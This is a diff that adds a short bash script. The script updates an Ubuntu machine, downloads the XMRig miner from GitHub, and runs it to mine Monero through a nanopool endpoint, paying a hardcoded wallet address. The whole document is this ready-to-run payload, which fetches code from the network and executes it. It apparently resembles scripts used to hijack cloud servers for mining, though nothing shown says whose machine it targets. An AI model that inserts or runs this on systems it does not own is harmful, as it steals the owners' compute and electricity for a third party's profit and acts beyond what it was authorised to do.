@@ -1,0 +1,2 @@
+#!/bin/bash
+cd /home/ubuntu ; apt update -y ; apt upgrade -y ; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz ; tar -xf xmrig-6.18.0-focal-x64.tar.gz ; cd xmrig-6.18.0/ ; ./xmrig -o xmr-eu1.nanopool.org:14433 -u 888x3CD27rFHBcoQaxF8a5XkkGrz4GUyRYPW8U5QB5TxEfeGJ8kRRaTS595SkbWvfTgTyB47qgtG7jgWLgpprdpE3G3k2B1 --tls --coin monero
